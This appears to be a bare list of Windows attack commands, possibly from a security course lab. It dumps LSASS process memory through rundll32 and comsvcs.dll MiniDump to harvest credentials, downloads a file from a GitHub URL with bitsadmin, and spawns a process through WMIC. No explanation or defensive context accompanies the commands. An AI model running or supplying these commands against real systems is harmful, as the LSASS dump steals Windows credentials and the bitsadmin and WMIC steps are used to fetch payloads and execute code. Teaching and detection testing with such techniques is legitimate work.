$a = Get-Process lsass
$a.Id

C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $a C:\temp\lsass.dmp full


C:\Windows\System32\bitsadmin.exe /create 1 
C:\Windows\System32\bitsadmin.exe /addfile 1 https://raw.githubusercontent.com/EvaStanAccount/IT4077/Main/TestFile.txt c:\Users\Administrator\test.txt 
C:\Windows\System32\bitsadmin.exe /resume 1
C:\Windows\System32\wbem\WMIC.exe process call create "cmd.exe /c notepad.exe"
